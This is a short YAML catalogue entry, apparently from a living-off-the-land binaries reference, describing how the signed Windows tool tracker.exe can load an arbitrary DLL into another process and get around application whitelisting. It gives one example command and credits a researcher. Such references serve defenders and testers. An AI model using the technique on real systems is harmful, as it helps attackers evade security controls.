---
name: tracker.exe
description: 
functions:
  execute:
    - description: Use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions.
      code: Tracker.exe /d .\calc.dll /c C:\Windows\write.exe
resources: 
    - resource: https://twitter.com/subTee/status/793151392185589760
    - resource: https://attack.mitre.org/wiki/Execution
fullpath: 
    - path: Missing
notes: Thanks to Casey Smith - @subTee
---